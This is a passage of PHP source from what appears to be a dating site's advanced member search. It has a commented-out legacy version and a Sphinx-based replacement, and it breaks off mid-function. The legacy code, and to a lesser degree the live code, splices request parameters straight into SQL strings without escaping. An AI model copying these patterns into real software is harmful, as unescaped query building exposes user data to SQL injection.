<?php
//note 高级查询显示页面]
//function advance_search_page($gender, $age_start, $age_end, $work_province, $work_city, $marriage, $salary, $education, $height1, $height2, $weight1, $weight2, $body, $smoking, $drinking, $occupation, $house, $vehicle, $corptype, $children, $wantchildren, $home_townprovince, $home_towncity, $nation, $animalyear, $constellation, $bloodtype, $religion, $family, $language, $photo) {
//    global $_MooClass, $dbTablePre;
//    global $user_arr, $userid,$last_login_time;
//    $returnurl = 'index.php?' . $_SERVER['QUERY_STRING']; //返回的url
//    //note 获得当前的url 去除多余的参数page=
//    $currenturl = 'http://' . $_SERVER['SERVER_NAME'] . ':' . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
//    $currenturl2 = preg_replace("/(&page=\d+)/", "", $currenturl);
//    $url3 = preg_replace("/(&orderby=\d+)/", "", $currenturl2);
//    $is_online_url = preg_replace("/(&is_online=\d+)/", "", $currenturl2) . "&is_online=1";
//    
//    $tiemstamp = time();
//    $expiretime2 = $tiemstamp - 3600; //过期时间
//    
//    /* 以下分页参数设置 */
//    //note  每页显示个数
//    if ($_GET['condition'] == '2') {
//        $pagesize = 6;
//    } else if ($_GET['condition'] == '3') {
//        $pagesize = 16;
//    } else {
//        $pagesize = 6;
//    }
//
//    //note 获得第几页
//    $page = intval(max(1, $_GET["page"]));
//
//    //note limit查询开始位置
//    $start = ($page - 1) * $pagesize;
//
//    //note 岁数
//    $age_sql = '';
//    if ($age_end > 0 && $age_start > 0) {
//        $tmp_start = gmdate('Y', time()) - intval($age_start);
//        $tmp_end = gmdate('Y', time()) - intval($age_end);
//        if ($age_start > $age_end) {
//            $age_sql = " and birthyear >= '" . $tmp_start . "' and birthyear <= '" . $tmp_end . "'";
//        } else {
//            $age_sql = " and birthyear >= '" . $tmp_end . "' and birthyear <= '" . $tmp_start . "'";
//        }
//    } else if ($age_start > 0) {
//        $tmp_start = gmdate('Y', time()) - intval($age_start);
//        $age_sql = " and birthyear <= '" . $tmp_start . "'";
//    } else if ($age_end > 0) {
//        $tmp_end = gmdate('Y', time()) - intval($age_end);
//        $age_sql = " and birthyear >= '" . $tmp_end . "'";
//    }
//
//    //note 地区条件查询sql语句
//    $area_sql = '';
//    if ($work_city != '-1' && $work_province != '-1') {
//        $area_sql = ' AND province = ' . $work_province . ' AND city = ' . $work_city;
//    } elseif ($work_city == '-1' && $work_province != '-1') {
//        $area_sql = ' AND province = ' . $work_province;
//    } elseif ($work_province == '-1' && $work_city == '-1') {
//        $area_sql = '';
//    } else {
//        $area_sql = '';
//    }
//    if ($work_province == "-1") {
//        $area_sql = '';
//    }
//
//    //note 婚姻状况条件查询sql语句
//    $marriage_sql = '';
//    $newmarriage = '';
//    if (is_array($marriage)) {
//        $newmarriage = implode(',', $marriage);
//        $marriage_sql = " and  marriage in(";
//        foreach ($marriage as $v) {
//        	if(!empty($v)){
//            	$marr_sql[] = $v;
//        	}
//        }
//        if ($marr_sql) {
//            $marr_sql = join(",", $marr_sql);
//        }
//        $marriage_sql.=$marr_sql . ")";
//        $marriage_sql1.=$marr_sql . ")";
//    }
//    if ($marriage == '-1')
//        $marriage_sql = '';
//    if (empty($newmarriage))
//        $newmarriage = '-1';
//
//    //note 月收入条件查询sql语句
//    $salary_sql = '';
//    $newsalary = '';
//    if (is_array($salary)) {
//        $newsalary = implode(',', $salary);
//        $salary_sql = " and salary in(";
//        $salary_sql1 = " and salary in(";
//        foreach ($salary as $v) {
//        	if(!empty($v)){
//            	$sal_sql[] = $v;
//        	}	
//        }
//        if ($sal_sql) {
//            $sal_sql = join(",", $sal_sql);
//        }
//        $salary_sql.=$sal_sql . ")";
//        $salary_sql1.=$sal_sql . ")";
//    }
//    if ($salary == '-1')
//        $salary_sql = '';
//    if (empty($newsalary))
//        $newsalary = '-1';
//
//    //note 教育程度条件查询sql语句
//    $education_sql = '';
//    $neweducation = '';
//    if (is_array($education)) {
//        $neweducation = implode(',', $education);
//        $education_sql = " and  education in(";
//        foreach ($education as $v) {
//        	if(!empty($v)){
//            	$e_sql[] = $v;
//        	}
//        }
//        if ($e_sql) {
//            $e_sql = join(",", $e_sql);
//        }
//        $education_sql.=$e_sql . ")";
//    }
//    if ($education == '-1')
//        $education_sql = '';
//    if (empty($neweducation))
//        $neweducation = '-1';
//
//    //note 身高条件查询sql语句
//    $height_sql = '';
//    if ($height1 != '-1' && $height2 != '-1' && ($height2 > $height1)) {
//        $height_sql = ' AND (height >= ' . $height1 . ' AND height <= ' . $height2 . ')';
//    } else if ($height1 != '-1' && $height2 != '-1' && ($height2 < $height1)) {
//        $height_sql = ' AND (height <= ' . $height1 . ' AND height >= ' . $height2 . ')';
//    } else if ($height1 != '-1' && $height2 == '-1') {
//        $height_sql = ' AND height >= ' . $height1;
//    } else if ($height2 != '-1' && $height1 == '-1') {
//        $height_sql = ' AND height <=' . $height2;
//    } else if ($height1 != '-1' && $height2 != '-1' && $height1 == $height2) {
//        $height_sql = ' AND height =' . $height1;
//    } else if ($height2 == '-1' && $height1 == '-1') {
//        $height_sql = '';
//    }
//
//    //note 体重条件查询sql语句
//    $weight_sql = '';
//    if ($weight1 != '-1' && $weight2 != '-1' && ($weight2 > $weight1)) {
//        $weight_sql = ' AND (weight >= ' . $weight1 . ' AND weight <= ' . $weight2 . ')';
//    } else if ($weight1 != '-1' && $weight2 != '-1' && ($weight2 < $weight1)) {
//        $weight_sql = ' AND (weight <= ' . $weight1 . ' AND weight >= ' . $weight2 . ')';
//    } else if ($weight1 != '-1' && $weight2 == '-1') {
//        $weight_sql = ' AND weight >= ' . $weight1;
//    } else if ($weight2 != '-1' && $weight1 == '-1') {
//        $weight_sql = ' AND weight <=' . $weight2;
//    } else if ($weight1 != '-1' && $weight2 != '-1' && $weight1 == $weight2) {
//        $weight_sql = ' AND weight =' . $weight1;
//    } else if ($weight2 == '-1' && $weight1 == '-1') {
//        $weight_sql = '';
//    }
//
//    //note 是否抽烟查询sql语句
//    $smoking_sql = '';
//    $newsmoking = '';
//    if (is_array($smoking)) {
//        $newsmoking = implode(',', $smoking);
//        $smoking_sql = " and smoking in(";
//        foreach ($smoking as $v) {
//        	if(!empty($v)){
//            	$smok_sql[] = $v;
//        	}	
//        }
//        if ($smok_sql) {
//            $smok_sql = join(",", $smok_sql);
//        }
//        $smoking_sql.= $smok_sql . ")";
//    }
//    if ($smoking == '-1' || $smoking == '-2')
//        $smoking_sql = '';
//    if (empty($newsmoking))
//        $newsmoking = '-1';
//
//    //note 是否喝酒查询sql语句
//    $drinking_sql = '';
//    $newdrinking = '';
//    if (is_array($drinking)) {
//        $newdrinking = implode(',', $drinking);
//        $drinking_sql = " and drinking in(";
//        foreach ($drinking as $v) {
//        	if(!empty($v)){
//            	$drink_sql[] = $v;
//        	}
//        }
//        if ($drink_sql) {
//            $drink_sql = join(",", $drink_sql);
//        }
//        $drinking_sql.=$drink_sql . ")";
//    }
//    if ($drinking == '-1' || $drinking == '-2')
//        $drinking_sql = '';
//    if (empty($newdrinking))
//        $newdrinking = '-1';
//
//    //note 从事职业查询sql语句
//    $occupation_sql = '';
//    $newoccupation = '';
//    if (is_array($occupation)) {
//        $newoccupation = implode(',', $occupation);
//        $occupation_sql = " and occupation in( ";
//        foreach ($occupation as $v) {
//        	if(!empty($v)){
//            	$oc_sql[] = $v;
//        	}	
//        }
//        if ($oc_sql) {
//            $oc_sql = join(",", $oc_sql);
//        }
//        $occupation_sql.=$oc_sql . ")";
//    }
//    if ($occupation == '-1' || $occupation == '-2')
//        $occupation_sql = '';
//    if (empty($newoccupation))
//        $newoccupation = '-1';
//
//    //note 住房情况查询sql语句
//    $house_sql = '';
//    $newhouse = '';
//    if (is_array($house)) {
//        $newhouse = implode(',', $house);
//        $house_sql = "  and house in( ";
//        foreach ($house as $v) {
//        	if(!empty($v)){
//            	$ho_sql[] = $v;
//        	}	
//        }
//        if ($ho_sql) {
//            $ho_sql = join(",", $ho_sql);
//        }
//        $house_sql.=$ho_sql . ")";
//    }
//    if ($house == '-1' || $house == '-2')
//        $house_sql = '';
//    if (empty($newhouse))
//        $newhouse = '-1';
//
//    //note 购车查询sql语句
//    $vehicle_sql = '';
//    $newvehicle = '';
//    if (is_array($vehicle)) {
//        $newvehicle = implode(',', $vehicle);
//        $vehicle_sql = " and vehicle in(";
//        foreach ($vehicle as $v) {
//        	if(!empty($v)){
//            	$ve_sql[] = $v;
//        	}	
//        }
//        if ($ve_sql) {
//            $ve_sql = join(",", $ve_sql);
//        }
//        $vehicle_sql.=$ve_sql . ")";
//    }
//    if ($vehicle == '-1' || $vehicle == '-2')
//        $vehicle_sql = '';
//    if ($vehicle == '-1')
//        $vehicle_sql = '';
//    if (empty($newvehicle))
//        $newvehicle = '-1';
//
//    //note 公司类别sql语句
//    $corptype_sql = '';
//    $newcorptype = '';
//    if (is_array($corptype)) {
//        $newcorptype = implode(',', $corptype);
//        $corptype_sql = "  and corptype in(";
//        foreach ($corptype as $v) {
//        	if(!empty($v)){
//            	$co_sql[] = $v;
//        	}	
//        }
//        if ($co_sql) {
//            $co_sql = join(",", $co_sql);
//        }
//        $corptype_sql.=$co_sql . " )";
//    }
//    if ($corptype == '-1' || $corptype == '-2')
//        $corptype_sql = '';
//    if (empty($newcorptype))
//        $newcorptype = '-1';
//
//    //note 是否有孩子sql语句
//    $children_sql = '';
//    $newchildren = '';
//    if (is_array($children)) {
//        $newchildren = implode(',', $children);
//        $children_sql = "  and  children in(";
//        foreach ($children as $v) {
//        	if(!empty($v)){
//            	$chil_sql[] = $v;
//        	}	
//        }
//        if ($chil_sql) {
//            $chil_sql = join(",", $chil_sql);
//        }
//        $children_sql.=$chil_sql . ")";
//    }
//    if ($children == '-1' || $children == '-2')
//        $children_sql = '';
//    if (empty($newchildren))
//        $newchildren = '-1';
//
//    //note 是否要孩子sql语句
//    $wantchildren_sql = '';
//    $newantchildren = '';
//    if (is_array($wantchildren)) {
//        $newantchildren = implode(',', $wantchildren);
//        $wantchildren_sql = "  and wantchildren in(";
//        foreach ($wantchildren as $v) {
//        	if(!empty($v)){
//            	$wan_sql[] = $v;
//        	}	
//        }
//        if ($wan_sql) {
//            $wan_sql = join(",", $wan_sql);
//        }
//        $wantchildren_sql.=$wan_sql . ")";
//    }
//    if ($wantchildren == '-1' || $wantchildren == '-2')
//        $wantchildren_sql = '';
//    if (empty($newantchildren))
//        $newantchildren = '-1';
//
//    //note 籍贯查询sql语句
//    $hometown_sql = '';
//    if ($home_townprovince != '-1' && $home_towncity != '-1') {
//        $hometown_sql = ' AND hometownprovince = ' . $home_townprovince . ' AND hometowncity = ' . $home_towncity;
//    } elseif ($home_towncity == '-1' && $home_townprovince != '-1') {
//        $hometown_sql = ' AND hometownprovince = ' . $home_townprovince;
//    }if ($home_townprovince == '-1' && $home_towncity == '-1')
//        $hometown_sql = '';
//
//    //note 民族查询sql语句
//    $nation_sql = '';
//    if ($nation != '-1') {
//        $nation_sql = ' AND nation = ' . $nation;
//    } else {
//        $nation_sql = '';
//    }
//
//    //note 体型查询sql语句
//    $body_sql = '';
//    $newbody = '';
//    if (is_array($body)) {
//        $newbody = implode(',', $body);
//        $body_sql = " and body in(";
//        foreach ($body as $v) {
//        	if(!empty($v)){
//            	$bo_sql[] = $v;
//        	}
//        }
//        if ($bo_sql) {
//            $bo_sql = join(",", $bo_sql);
//        }
//        $body_sql.=$bo_sql . ")";
//    }
//    if ($body == '-1' || $body == '-2')
//        $body_sql = '';
//    if (empty($newbody))
//        $newbody = '-1';
//
//    //note 生肖查询sql语句
//    $animalyear_sql = '';
//    $newanimalyear = '';
//    if (is_array($animalyear)) {
//        $newanimalyear = implode(',', $animalyear);
//        $animalyear_sql = "  and animalyear in(";
//        foreach ($animalyear as $v) {
//        	if(!empty($v)){
//            	$ani_sql[] = $v;
//        	}
//        }
//        if ($ani_sql) {
//            $ani_sql = join(",", $ani_sql);
//        }
//        $animalyear_sql.=$ani_sql . ")";
//    }
//    if ($animalyear == '-1' || $animalyear == '-2')
//        $animalyear_sql = '';
//    if (empty($newanimalyear))
//        $newanimalyear = '-1';
//
//    //note 星座查询sql语句
//    $constellation_sql = '';
//    $newconstellation = '';
//    if (is_array($constellation)) {
//        $newconstellation = implode(',', $constellation);
//        $constellation_sql = " and  constellation in( ";
//        foreach ($constellation as $v) {
//        	if(!empty($v)){
//            	$cons_sql[] = $v;
//        	}	
//        }
//        if ($cons_sql) {
//            $cons_sql = join(",", $cons_sql);
//        }
//        $constellation_sql.=$cons_sql . ")";
//    }
//    if ($constellation == '-1' || $constellation == '-2')
//        $constellation_sql = '';
//    if (empty($newconstellation))
//        $newconstellation = '-1';
//
//    //note 血型查询sql语句
//    $bloodtype_sql = '';
//    $newbloodtype = '';
//    if (is_array($bloodtype)) {
//        $newbloodtype = implode(',', $bloodtype);
//        $bloodtype_sql = " and bloodtype in(";
//        foreach ($bloodtype as $v) {
//        	if(!empty($v)){
//            	$bloo_sql[] = $v;
//        	}	
//        }
//        if ($bloo_sql) {
//            $bloo_sql = join(",", $bloo_sql);
//        }
//        $bloodtype_sql.=$bloo_sql . ")";
//    }
//    if ($bloodtype == '-1' || $bloodtype == '-2')
//        $bloodtype_sql = '';
//
//    if (empty($newbloodtype))
//        $newbloodtype = '-1';
//
//    //note 信仰查询sql语句
//    $religion_sql = '';
//    $newreligion = '';
//    if (is_array($religion)) {
//        $newreligion = implode(',', $religion);
//        $religion_sql = "  and  religion in(";
//        foreach ($religion as $v) {
//        	if(!empty($v)){
//            	$reli_sql[] = $v;
//        	}	
//        }
//        if ($reli_sql) {
//            $reli_sql = join(",", $reli_sql);
//        }
//        $religion_sql.=$reli_sql . ")";
//    }
//    if ($religion == '-1' || $religion == '-2')
//        $religion_sql = '';
//    if (empty($newreligion))
//        $newreligion = '-1';
//
//    //note 兄弟姐妹sql语句
//    $family_sql = '';
//    $newfamily = '';
//    if (is_array($family)) {
//        $newfamily = implode(',', $family);
//        $family_sql = " and  family in(";
//        foreach ($family as $v) {
//        	if(!empty($v)){
//            	$fami_sql[] = $v;
//        	}	
//        }
//        if ($fami_sql) {
//            $fami_sql = join(",", $fami_sql);
//        }
//        $family_sql.=$fami_sql . ")";
//    }
//    if ($family == '-1' || $family == '-2')
//        $family_sql = '';
//    if (empty($newfamily))
//        $newfamily = '-1';
//
//    //note 语言能力sql语句，采用like查询
//    $language_sql = '';
//    $newlanguage = '';
//    if (is_array($language)) {
//        $newlanguage = implode(',', $language);
//        $language_sql = " and(";
//        $lan_sql = "";
//        foreach ($language as $v) {
//            if (empty($lan_sql)) {
//                $lan_sql .= " FIND_IN_SET('" . $v . "'," . "language)";
//            } else {
//                $lan_sql .= " or FIND_IN_SET('" . $v . "'," . "language)";
//            }
//        }
//        $language_sql .= $lan_sql . ")";
//    }
//    if ($language == '-1' || $language == '-2')
//        $language_sql = '';
//    if (empty($newlanguage))
//        $newlanguage = '-1';
//
//    
//    //note 查询是否显示照片
//    $photo_sql = '';
//    if ($photo == '1') {
//        $photo_sql = " AND images_ischeck = '1'";
//    }else{
//		$photo_sql = " AND images_ischeck in(1,0,-1)";
//	}
//    
//	
//    $sql = " where   is_lock = '1'  " . $photo_sql .$age_sql . $area_sql . $marriage_sql . $salary_sql . $education_sql . $height_sql . $weight_sql . $smoking_sql . $drinking_sql . $occupation_sql . $house_sql . $vehicle_sql . $corptype_sql . $children_sql . $wantchildren_sql . $hometown_sql . $nation_sql . $body_sql . $animalyear_sql . $constellation_sql . $bloodtype_sql . $religion_sql . $family_sql . $language_sql;
//	/*$sql = str_replace("where  and"," where ",$sql);
//	$sql = str_replace("where  AND"," where ",$sql);*/
//	
//    /*
//	if(!$photo_sql&&!$age_sql && !$area_sql && !$marriage_sql && !$salary_sql && !$education_sql && !$height_sql && !$weight_sql && !$smoking_sql && !$drinking_sql && !$occupation_sql && !$house_sql && !$vehicle_sql && !$corptype_sql && !$children_sql && !$wantchildren_sql && !$hometown_sql && !$nation_sql && !$body_sql && !$animalyear_sql && !$constellation_sql && !$bloodtype_sql && !$religion_sql && !$family_sql && !$language_sql)
//	$sql = str_replace("where","",$sql);
//	*/
//	//echo $sql;
//	
//	//note 增加缓存sql语句性別区分
//    $sql_md5 = md5($gender.$sql); //md5保存sql
//    $sql_search = "select id from `{$dbTablePre}member_tmp` where `condition_md5`='{$sql_md5}' and expiretime > '$expiretime2'";
//    $ret_search = $_MooClass['MooMySQL']->getOne($sql_search);
//    
//    //有保存的搜索条件时
//    if ($ret_search) {
//        $search_id = $ret_search['id'];
//         high_search_index($search_id, $gender, $age_start, $age_end, $work_province, $work_city, $newmarriage, $newsalary, $neweducation, $height1, $height2, $weight1, $weight2, $newbody, $newsmoking, $newdrinking, $newoccupation, $newhouse, $newvehicle, $newcorptype, $newchildren, $newantchildren, $home_townprovince, $home_towncity, $nation, $newanimalyear, $newconstellation, $newbloodtype, $newreligion, $newfamily, $newlanguage, $photo, $page);
//        exit;
//    } else {
////   	if($user_arr['last_search_time'] + 30 >= $tiemstamp ){
////			MooMessage('对不起，您30秒内只能搜索一次，请返回！',$_SERVER['HTTP_REFERER'],'03');
////		}else{
////			$_MooClass['MooMySQL']->query("update {$dbTablePre}members set last_search_time='$tiemstamp' where uid='$userid'");
////		}
//        
//		//note 测试替换sql
//		//echo $sql;
//		   	
//        //note 判断是查询男性会员表还是女性会员表
//        $table_search_advance = 'membersfastadvance_man'; 
//        if($gender == '1'){
//        	$table_search_advance = 'membersfastadvance_women';	
//        }
//		//note 普通会员搜索结果还是按照以前的排序，高级、钻石会员搜索结果按照本站注册的排序
//		if($user_arr["s_cid"]=="2"){
//			if(empty($area_sql)){
//				$sort = " order by m.s_cid asc, m.bgtime desc, m.birthyear desc, m.pic_num desc";
//			}else{
//				$sort = " order by m.city_star desc, m.s_cid asc, m.bgtime desc, m.birthyear desc, m.pic_num desc"; //城市之星靠前	
//			}
//		}else{
//			if(empty($area_sql)){
//				$sort = " order by m.s_cid asc, m.usertype asc, m.bgtime desc, m.birthyear desc, m.pic_num desc";
//			}else{
//				$sort = " order by m.city_star desc, m.s_cid asc, m.usertype asc, m.bgtime desc, m.birthyear desc, m.pic_num desc"; //城市之星靠前	
//			}
//		}
////		echo "select uid from `{$dbTablePre}{$table_search_advance}` m ".$sql.$sort."  LIMIT 0,600";die;
//        //note 查询得到有多少个uid
//        $user = $_MooClass['MooMySQL']->getAll("select uid from `{$dbTablePre}{$table_search_advance}` m ".$sql.$sort."  LIMIT 0,600");
//        
//        $user_list = "";
//        if (!empty($user)) {
//            foreach ($user as $v) {
//                $user_uid .= $v['uid'] . ',';
//            }
//            if (!empty($user_uid))
//                $user_uid = substr($user_uid, 0, -1);
//            $user_list .= $user_uid;
//        }
//
//        if (!empty($user1)) {
//            foreach ($user1 as $v) {
//                $user_uid2 .= $v['uid'] . ',';
//            }
//            if (!empty($user_uid2))
//                $user_uid2 = substr($user_uid2, 0, -1);
//            $user_list .= '|' . $user_uid2;
//        }
//
//        $addtime = time();
//        $expiretime = $addtime + 3600;
//        $sql = "select id from `{$dbTablePre}member_tmp` where condition_md5 = '$sql_md5'";
//        $ret = $_MooClass['MooMySQL']->getOne($sql);
//        if ($ret['id']) {  //有则更新
//            $search_id = $ret['id'];
//            $_MooClass['MooMySQL']->query("update `{$dbTablePre}member_tmp` set search_uid='$userid' , uid_list='$user_list', addtime='$addtime',expiretime='$expiretime' where id='$search_id'");
//        } else {    //无则插入
//            $sql = "insert into `{$dbTablePre}member_tmp` set search_uid='$userid',condition_md5='$sql_md5',uid_list='$user_list',addtime='$addtime',expiretime='$expiretime'";
//            $_MooClass['MooMySQL']->query($sql);
//            $search_id = $_MooClass['MooMySQL']->insertId();
//        }
//        high_search_index($search_id, $gender, $age_start, $age_end, $work_province, $work_city, $newmarriage, $newsalary, $neweducation, $height1, $height2, $weight1, $weight2, $newbody, $newsmoking, $newdrinking, $newoccupation, $newhouse, $newvehicle, $newcorptype, $newchildren, $newantchildren, $home_townprovince, $home_towncity, $nation, $newanimalyear, $newconstellation, $newbloodtype, $newreligion, $newfamily, $newlanguage, $photo, $page,$user_list);
//        exit;
//    }
//}
function advance_search_page($gender, $age_start, $age_end, $work_province, $work_city, $marriage, $salary, $education, $height1, $height2, $weight1, $weight2, $body, $smoking, $drinking, $occupation, $house, $vehicle, $corptype, $children, $wantchildren, $home_townprovince, $home_towncity, $nation, $animalyear, $constellation, $bloodtype, $religion, $family, $language, $photo) {
    global $_MooClass, $dbTablePre;
    global $user_arr, $userid,$last_login_time,$isdelcond,$isselectarea,$isdispmore,$isresult;
    //print_r($user_arr);
    $returnurl = 'index.php?' . $_SERVER['QUERY_STRING']; //返回的url
    //note 获得当前的url 去除多余的参数page=
    $currenturl = 'http://' . $_SERVER['SERVER_NAME'] . ':' . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    $currenturl2 = preg_replace("/(&page=\d+)/", "", $currenturl);
    $url3 = preg_replace("/(&orderby=\d+)/", "", $currenturl2);
    $is_online_url = preg_replace("/(&is_online=\d+)/", "", $currenturl2) . "&is_online=1";
    
	//分页相关参数
    if(isset($_GET['condition']) && $_GET['condition'] == '2') {
        $pagesize = 6;
    }else if(isset($_GET['condition']) && $_GET['condition'] == '3') {
        $pagesize = 16;
    }else{
        $pagesize = 6;
    }
    $page = 1;
    if(isset($_GET['page']) && $_GET['page']) $page = $_GET['page'];
    $offset = ($page-1)*$pagesize;
	$blacklist = BlackList();
	$index = 'members_women';
	if($gender == 0) $index = 'members_man';
	if($age_start || $age_end){
		if($age_start==0) $age_start=18;
		if($age_end==0) $age_end=99;
	}
	
//	$sort = array();
//	//note 普通会员搜索结果还是按照以前的排序，高级、钻石会员搜索结果按照本站注册的排序
//	if(isset($user_arr['s_cid']) && ($user_arr['s_cid'] =='40' || $user_arr['s_cid'] == '30')){
//		if($work_province || $work_city){
//			$sort = array('s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc');
//		}else{
//			$sort = array('city_star desc','s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc'); //城市之星靠前	
//		}
//	}else{
//		if($work_province || $work_city){
//			$sort = array('s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc');
//		}else{
//			$sort = array('city_star desc','s_cid asc','@weight desc','bgtime desc','birthyear desc','pic_num desc'); //城市之星靠前		
//		}
//	}
//	$sortway = '1';
//	$sort_str = array();
//	if(isset($_GET['sortway']) && $_GET['sortway'] == '2'){
//		//note 最新注册
//		$sortway = '2';
//		$sort_str = array('regdate desc');
//		$sort_str[] = $sort[0];
//		$sort_str[] = $sort[1];
//		$sort_str[] = $sort[2];
//		$sort_str[] = $sort[3];
//	}elseif(isset($_GET['sortway']) && $_GET['sortway'] == '3'){
//		//note 诚信等级
//		$sortway = '3';
//		$sort_str = array('certification desc');
//		$sort_str[] = $sort[0];
//		$sort_str[] = $sort[1];
//		$sort_str[] = $sort[2];
//		$sort_str[] = $sort[3];
//	}else{
//		$sort_str[] = $sort[0];
//		$sort_str[] = $sort[1];
//		$sort_str[] = $sort[2];
//		$sort_str[] = $sort[3];
//		$sort_str[] = $sort[4];
//	}
//	if(is_array($sort_str) && !empty($sort_str)) $sort_str = implode(",",$sort_str);
//	else if(is_array($sort) && !empty($sort)) $sort_str = implode(",",$sort);
//	
//	if(!$sort_str) $sort_str= '@weight desc';
	

	$cond = array();
	$cond[] = array('is_lock','1',false);
	if($photo) $cond[] = array('images_ischeck','1',false);
	$cond[] = array('usertype','1',false);
	if(is_array($blacklist) && !empty($blacklist))  $cond[] = array('@id',implode('|',$blacklist),true);
	if($age_start && $age_end){
		$year = date('Y',time());
		$cond[] = array('birthyear',array(($year-$age_end),($year-$age_start)),false);
	}
	if($work_province) $cond[] = array('province',$work_province,false);
	elseif(isset($user_arr['province']) && $user_arr['province'] && !$work_city) $cond[] = array('province',$user_arr['province'],false);
	if($work_city) $cond[] = array('city',$work_city,false);
	elseif(isset($user_arr['city']) && $user_arr['city'] && !$work_province) $cond[] = array('city',$user_arr['city'],false);
	$dispmore=false;
	if($work_province || $work_city){
		$isselectarea = true;
		$isdispmore = false;
		$dispmore = MooGetGPC('dm');
		if($dispmore) $isdispmore=true;
	}
	
	if($height1 || $height2){
		if($height1 == 0) $cond_height1=154;
		else $cond_height1 = $height1;
		if($height2 == 0) $cond_height2=201;
		else $cond_height2 = $height2;
		$cond[] = array('height',array($cond_height1,$cond_height2),false);
	}
	if($weight1 || $weight2){
		if($weight1 == 0) $cond_weight1=40;
		else $cond_weight1 = $weight1;
		if($weight2 == 0) $cond_weight2=81;
		else $cond_weight2 = $weight2;
		$cond[] = array('weight',array($cond_weight1,$cond_weight2),false);
	}
	if(is_array($marriage) && !empty($marriage) && !in_array('0',$marriage)){
		$cond[] = array('marriage',implode(' | ',$marriage));
	}
	if(is_array($salary) && !empty($salary) && !in_array('0',$salary)){
		$cond[] = array('salary',implode(' | ',$salary));
	}
	if(is_array($education) && !empty($education) && !in_array('0',$education)){
		$cond[] = array('education',implode(' | ',$education));
	}
	if(is_array($body) && !empty($body) && !in_array('0',$body)){
		$cond[] = array('body',implode(' | ',$body));
	}
	if(is_array($smoking) && !empty($smoking) && !in_array('0',$smoking)){
		$cond[] = array('smoking',implode(' | ',$smoking));
	}
	if(is_array($drinking) && !empty($drinking) && !in_array('0',$drinking)){
		$cond[] = array('drinking',implode(' | ',$drinking));
	}
	if(is_array($occupation) && !empty($occupation) && !in_array('0',$occupation)){
		$cond[] = array('occupation',implode(' | ',$occupation));
	}
	if(is_array($house) && !empty($house) && !in_array('0',$house)){
		$cond[] = array('house',implode(' | ',$house));
	}
	if(is_array($vehicle) && !empty($vehicle) && !in_array('0',$vehicle)){
		$cond[] = array('vehicle',implode(' | ',$vehicle));
	}
	if(is_array($corptype) && !empty($corptype) && !in_array('0',$corptype)){
		$cond[] = array('corptype',implode(' | ',$corptype));
	}
	if(is_array($children) && !empty($children) && !in_array('0',$children)){
		$cond[] = array('children',implode(' | ',$children));
	}
	if(is_array($wantchildren) && !empty($wantchildren) && !in_array('0',$wantchildren)){
		$cond[] = array('wantchildren',implode(' | ',$wantchildren));
	}
	if($home_townprovince){
		$cond[] = array('hometownprovince',$home_townprovince);
	}
	if($home_towncity){
		$cond[] = array('hometowncity',$home_towncity);
	}
	if($nation){
		$cond[] = array('nation',$nation);
	}
	if(is_array($animalyear) && !empty($animalyear) && !in_array('0',$animalyear)){
		$cond[] = array('animalyear',implode(' | ',$animalyear));
	}
	if(is_array($constellation) && !empty($constellation) && !in_array('0',$constellation)){
		$cond[] = array('constellation',implode(' | ',$constellation));
	}
	if(is_array($bloodtype) && !empty($bloodtype) && !in_array('0',$bloodtype)){
		$cond[] = array('bloodtype',implode(' | ',$bloodtype));
	}
	if(is_array($religion) && !empty($religion) && !in_array('0',$religion)){
		$cond[] = array('religion',implode(' | ',$religion));
	}
	if(is_array($family) && !empty($family) && !in_array('0',$family)){
		$cond[] = array('family',implode(' | ',$family));
	}
	if(is_array($language) && !empty($language) && !in_array('0',$language)){
		$cond[] = array('language',implode(' | ',$language));
	}
	
	$sortway = MooGetGPC('sortway');
	$sort_str = getSortsStr($sortway,$cond);

	$rs = sphinx_search($index,$cond,$sort_str,$page,$pagesize);
	
	if(!$rs || is_array($rs) && empty($rs)){//没有结果
		//MooMessage("您指定的搜索不存在或已过期", "index.php?n=search", '03');
		include MooTemplate('public/search_error', 'module');exit;
	}else{
		$data = $rs['user'];
		$total = $rs['total'];
		if($total > 600) $total = 600;
		$user_list = implode(',',$data);
		if(empty($data)) {
			//MooMessage("您指定的搜索不存在或已过期", "index.php?n=search", '03');
			include MooTemplate('public/search_error', 'module');exit;
		}else{
			$user = array();
			$sortway = isset($_GET['sortway']) ? $_GET['sortway'] : '1';
	        $sql="select s.*,b.mainimg from `{$dbTablePre}members_search` s left join `{$dbTablePre}members_base` b on s.uid=b.uid where s.uid in ({$user_list}) order by s.city_star desc,s.s_cid asc";
	        $user = $_MooClass['MooMySQL']->getAll($sql);
	    }
		//会员基本信息补充
		if($user){
			$user = userbasicadd($user);
			//排序
			$tmp_user = array();
			foreach($data as $k=>$v){
				foreach($user as $key=>$val){
					if($v == $val['uid']){
						$tmp_user[] = $user[$key];
						break;
					}
				}
			}
			$user = $tmp_user;
		}
	
	    //note 找不到匹配的结果返回单独提示页面
	    if (empty($user)) {
	        include MooTemplate('public/search_error', 'module');
	        exit;
	    }
	
	    //note 记录婚姻状况
	    $marriageArr = array();
	    if ($marriage != '0') {
	        if (!is_array($marriage) && strlen($marriage) == 1) {
	            $marriageArr[] = $marriage;
	        } else {
	            $marriageArr = $marriage;
	        }
	    }
	    //note 记录月收入
	    $salaryArr = array();
	    if ($salary != '0') {
	        if (!is_array($salary) && strlen($salary) == 1) {
	            $salaryArr[] = $salary;
	        } else {
	            $salaryArr = $salary;
	        }
	    }
	    //note 记录教育情况
	    $educationArr = array();
	    if ($education != '0') {
	        if (!is_array($education) && strlen($education) == 1) {
	            $educationArr[] = $education;
	        } else {
	            $educationArr = $education;
	        }
	    }
	
	    //note 记录住房情况
	    $houseArr = array();
	    if ($house != '0') {
	        if (!is_array($house) && strlen($house) == 1) {
	            $houseArr[] = $house;
	        } else {
	            $houseArr = $house;
	            $house = implode(',',$house);
	        }
	    }
	
	    //note 记录是否购车
	    $vehicleArr = array();
	    if ($vehicle != '0') {
	        if (!is_array($vehicle) && strlen($vehicle) == 1) {
	            $vehicleArr[] = $vehicle;
	        } else {
	            $vehicleArr = $vehicle;
	            $vehicle = implode(',',$vehicle);
	        }
	    }
	    if ($nation != '0') {
	        if (!is_array($nation)) {
	            $nationArr[] = $nation;
	        } else {
	            $nationArr = $nation;
	            $nation = implode(',',$nation);
	        }
	    }
	
